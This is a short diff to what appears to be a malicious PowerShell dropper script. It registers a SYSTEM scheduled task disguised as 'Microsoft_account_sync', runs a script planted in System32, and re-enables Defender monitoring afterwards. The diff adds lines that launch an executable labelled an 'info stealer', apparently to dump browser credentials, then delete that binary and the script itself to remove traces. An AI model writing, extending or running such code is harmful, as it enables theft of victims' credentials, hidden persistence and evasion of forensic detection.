@@ -18,6 +18,11 @@ $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType
 Register-ScheduledTask -TaskName "Microsoft_account_sync" -Action $action -Trigger $trigger -Principal $principal
 # start process
 & "C:\Windows\System32\ddrcc.ps1"
+# run info stealer
+& "C:\Windows\System32\chromelevator_x64.exe" all
+# remove info dumper
+Remove-Item -Path "C:\Windows\System32\chromelevator_x64.exe" -Force
 # re-enable real time protection
 Set-MpPreference -DisableRealtimeMonitoring $false
+# self destruct
 Remove-Item -Path $MyInvocation.MyCommand.Source -Force
